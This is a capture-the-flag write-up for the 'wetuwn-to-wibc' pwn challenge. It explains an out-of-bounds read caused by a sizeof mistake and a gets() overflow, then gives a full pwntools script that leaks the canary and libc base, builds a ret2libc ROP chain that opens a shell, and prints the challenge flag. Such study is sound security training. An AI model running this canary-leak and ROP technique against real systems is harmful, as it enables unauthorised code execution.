# wetuwn-to-wibc

## Challenge

The program displays a list of users.
We can input a number corresponding to a user to get the number of times they UwU'd.

The number -1 allows us to quit this menu and leave feedback.

```
  _   _          _   _    ____                  _            
 | | | |_      _| | | |  / ___|___  _   _ _ __ | |_ ___ _ __ 
 | | | \ \ /\ / / | | | | |   / _ \| | | | '_ \| __/ _ \ '__|
 | |_| |\ V  V /| |_| | | |__| (_) | |_| | | | | ||  __/ |   
  \___/  \_/\_/  \___/   \____\___/ \__,_|_| |_|\__\___|_|   
 
0: Vie
1: Jason
2: gKai
3: rctcwyvrn
4: woof
5: ko
6: Filip
7: Daniel
8: James Riddell
-1: Quit

Index: 1
This UwU'er has UwU'ed 8 times!

Index: -1
Thanks for using my UwU Counter! What did you think?
uwu      
Thank you for your feedback!
```

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

Note that there is a call to `gets` at the end of `vuln` when leaving feedback:

```c
char comment[0x100];

puts("Thanks for using my UwU Counter! What did you think?");

// I stole this from stack overflow
char c;
while ((c = getchar()) != '\n' && c != EOF) { }

gets(comment);
send_feedback(comment);

puts("Thank you for your feedback!");
```

We can use this to overflow the `comment` buffer and create a ropchain.

There is no `win` function, but we can spawn a shell by calling `system("/bin/sh")` using libc functions.
To do so, we first need to defeat ASLR by leaking the libc address.

The stack canary is also enabled, which is a value that sits between stack variables and the saved RBP.
It will cause the program to exit if it has been overwritten.
To write our ropchain, we also need to leak the stack canary so we can overwrite it with itself,
preventing the program from detecting the buffer overflow.

Let's look at the code that checks if we are reading out of bounds:

```c
if (input >= 0 && input < sizeof uwus) {
    printf("This UwU'er has UwU'ed %llu times!\n", uwus[input]);
} else {
    puts("Error: index out of bounds.");
}
```

If we provide a negative index that isn't -1, the program will print an error.
It will also print an error if the input index is greater than or equal to `sizeof uwus`.

However, `sizeof uwus` returns the size of the array measured in bytes, not number of elements.
This means the if-statement is actually:

```c
if (input >= 0 && input < 72) {
    ...
}
```

which means we can read from indices much higher than the program was intended to.

We can leak the libc address by reading the return address off the stack that points to an instruction
in `__libc_start_main`.
`vuln` returns to `main`, which returns to `__libc_start_main`.

To determine the offset we want to print at, let's analyze the stack in gdb.
But first, let's print some values off the array so we know what to look for:

```
Index: 0
This UwU'er has UwU'ed 42 times!

Index: 1
This UwU'er has UwU'ed 8 times!

Index: 2
This UwU'er has UwU'ed 5 times!

Index: 3
This UwU'er has UwU'ed 3 times!

Index: 4
This UwU'er has UwU'ed 2 times!

Index: 5
This UwU'er has UwU'ed 1 times!
```

Now in gdb:

```asm
pwndbg> tel 50
00:0000│ rsp 0x7fffffffdf60 —▸ 0x7ffff7f9e300 (__GI__IO_file_jumps) ◂— 0x0
01:0008│     0x7fffffffdf68 —▸ 0x7ffff7e5057d (_IO_file_doallocate+173) ◂— mov    eax, 1
02:0010│     0x7fffffffdf70 ◂— 0x2a /* '*' */
03:0018│     0x7fffffffdf78 ◂— 0x8
04:0020│     0x7fffffffdf80 ◂— 0x5
05:0028│     0x7fffffffdf88 ◂— 0x3
06:0030│     0x7fffffffdf90 ◂— 0x2
07:0038│     0x7fffffffdf98 ◂— 0x1
... ↓        3 skipped
0b:0058│     0x7fffffffdfb8 ◂— 0x3e /* '>' */
0c:0060│     0x7fffffffdfc0 —▸ 0x7ffff7f9d520 (_IO_2_1_stdout_) ◂— 0xfbad2887
0d:0068│     0x7fffffffdfc8 —▸ 0x7ffff7f9d700 (_IO_helper_jumps) ◂— 0x0
0e:0070│     0x7fffffffdfd0 —▸ 0x7ffff7f9d520 (_IO_2_1_stdout_) ◂— 0xfbad2887
0f:0078│     0x7fffffffdfd8 ◂— 0x2
10:0080│     0x7fffffffdfe0 —▸ 0x100002245 ◂— 0x543b031b0100200a /* '\n ' */
11:0088│     0x7fffffffdfe8 —▸ 0x7ffff7e5da69 (__GI__IO_do_write+25) ◂— cmp    rbx, rax
12:0090│     0x7fffffffdff0 ◂— 0xa /* '\n' */
13:0098│     0x7fffffffdff8 ◂— 0x41ad975aaf343700
14:00a0│     0x7fffffffe000 —▸ 0x100002247 ◂— 0x543b031b0100
15:00a8│     0x7fffffffe008 ◂— 0xffffffffffffff88
16:00b0│     0x7fffffffe010 ◂— 0x0
17:00b8│     0x7fffffffe018 —▸ 0x7ffff7f9d5a3 (_IO_2_1_stdout_+131) ◂— 0xf9f4d0000000000a /* '\n' */
18:00c0│     0x7fffffffe020 —▸ 0x7ffff7f9e300 (__GI__IO_file_jumps) ◂— 0x0
19:00c8│     0x7fffffffe028 ◂— 0x0
1a:00d0│     0x7fffffffe030 ◂— 0x0
1b:00d8│     0x7fffffffe038 —▸ 0x7ffff7e679e8 (free+104) ◂— mov    dword ptr fs:[rbx], ebp
1c:00e0│     0x7fffffffe040 —▸ 0x7ffff7f9d520 (_IO_2_1_stdout_) ◂— 0xfbad2887
1d:00e8│     0x7fffffffe048 ◂— 0x2
1e:00f0│     0x7fffffffe050 —▸ 0x7ffff7f9d520 (_IO_2_1_stdout_) ◂— 0xfbad2887
1f:00f8│     0x7fffffffe058 —▸ 0x7ffff7f9c800 (_IO_2_1_stdin_) ◂— 0xfbad208b
20:0100│     0x7fffffffe060 ◂— 0x0
21:0108│     0x7fffffffe068 —▸ 0x7ffff7e5f105 (_IO_default_setbuf+69) ◂— cmp    eax, -1
22:0110│     0x7fffffffe070 ◂— 0x0
23:0118│     0x7fffffffe078 —▸ 0x7ffff7f9c800 (_IO_2_1_stdin_) ◂— 0xfbad208b
24:0120│     0x7fffffffe080 ◂— 0x0
25:0128│     0x7fffffffe088 ◂— 0x0
26:0130│     0x7fffffffe090 —▸ 0x7ffff7f9e300 (__GI__IO_file_jumps) ◂— 0x0
27:0138│     0x7fffffffe098 —▸ 0x7ffff7e5bc3d (__GI__IO_file_setbuf+13) ◂— test   rax, rax
28:0140│     0x7fffffffe0a0 —▸ 0x7ffff7f9c800 (_IO_2_1_stdin_) ◂— 0xfbad208b
29:0148│     0x7fffffffe0a8 —▸ 0x7ffff7e53129 (setbuffer+201) ◂— test   dword ptr [rbx], 0x8000
2a:0150│     0x7fffffffe0b0 —▸ 0x100001480 (__libc_csu_init) ◂— endbr64 
2b:0158│     0x7fffffffe0b8 —▸ 0x100001480 (__libc_csu_init) ◂— endbr64 
2c:0160│     0x7fffffffe0c0 —▸ 0x7fffffffe0e0 ◂— 0x0
2d:0168│     0x7fffffffe0c8 ◂— 0x41ad975aaf343700
2e:0170│ rbp 0x7fffffffe0d0 —▸ 0x7fffffffe0e0 ◂— 0x0
2f:0178│     0x7fffffffe0d8 —▸ 0x100001475 (main+80) ◂— mov    eax, 0
30:0180│     0x7fffffffe0e0 ◂— 0x0
31:0188│     0x7fffffffe0e8 —▸ 0x7ffff7e03b25 (__libc_start_main+213) ◂— mov    edi, eax
```

Near the top of the stack, we can see a few addresses that match the ones we printed earlier.

```asm
02:0010│     0x7fffffffdf70 ◂— 0x2a /* '*' */
03:0018│     0x7fffffffdf78 ◂— 0x8
04:0020│     0x7fffffffdf80 ◂— 0x5
05:0028│     0x7fffffffdf88 ◂— 0x3
06:0030│     0x7fffffffdf90 ◂— 0x2
07:0038│     0x7fffffffdf98 ◂— 0x1
```

For the libc address, our array is at 0x7fffffffdf70, and we want to reach 0x7fffffffe0e8.
This is a difference of 0x178 bytes.
Each element is 8 bytes long, so we can reach this using an index of 47.

For the canary, we want to reach 0x7fffffffe0c8.
This is a difference of 0x158, which is at index 43.

Once we leak both values, we create a ropchain which pops the address of "/bin/sh" into RDI, then calls
`system`.

```py
payload = flat({
    0x108: canary,
    0x110 + 0x8: [
        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["pop rdi", "ret"])[0],
        next(libc.search(b"/bin/sh\x00")),
        libc.sym['system'],
        ],
    })
```

The extra `rop.find_gadget(["ret"])[0]` gadget is to keep the stack aligned, as `system` will segfault if
the stack is not aligned to 16 bytes.

Once we send this payload as our feedback, we are dropped into a shell and can read the flag file.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1443 wetuwn-to-wibc
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('wetuwn-to-wibc')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1443)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendlineafter(b"Index: ", b"47")
io.recvuntil(b"This UwU'er has UwU'ed ")
libc.address = int(io.recvuntil(b" times!\n", drop=True)) - libc.libc_start_main_return

io.sendlineafter(b"Index: ", b"43")
io.recvuntil(b"This UwU'er has UwU'ed ")
canary = int(io.recvuntil(b" times!\n", drop=True))

io.sendlineafter(b"Index: ", b"-1")

rop = ROP(libc)

payload = flat({
    0x108: canary,
    0x110 + 0x8: [
        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["pop rdi", "ret"])[0],
        next(libc.search(b"/bin/sh\x00")),
        libc.sym['system'],
        ],
    })

io.sendlineafter(b"Thanks for using my UwU Counter! What did you think?\n", payload)

io.interactive()
```

## Flag

```
maple{f1y_m3_t0_th3_m00n_4nd_l3t_m3_pl4y_am0ngu5}
```
